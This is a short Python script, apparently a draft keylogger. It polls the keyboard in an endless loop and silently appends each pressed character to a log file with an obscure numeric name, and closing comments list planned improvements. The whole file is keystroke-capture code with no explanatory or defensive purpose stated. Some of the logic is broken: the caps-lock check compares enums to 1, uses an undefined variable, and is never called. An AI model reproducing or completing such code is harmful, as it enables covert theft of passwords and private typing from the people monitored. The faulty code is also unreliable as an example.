import keyboard, pynput.keyboard

char_set = "".join([chr(i) for i in range(32,127)])
keys_pressed = [""]

def is_caps():
    if pynput.keyboard.Key.caps_lock == 1 or pynput.keyboard.Key.shift == 1:
        key.upper()

def check_keys():
    for key in char_set:
        if keyboard.is_pressed(key):
            if keys_pressed[len(keys_pressed)-1] == key:
                return True
            else:
                keys_pressed.append(key.upper())
                with open("8945689546_log.data", "a") as file:
                    file.write(str(key))
                return True

while True:
    check_keys()

# detect case
# detect repeating latters e.g. 00
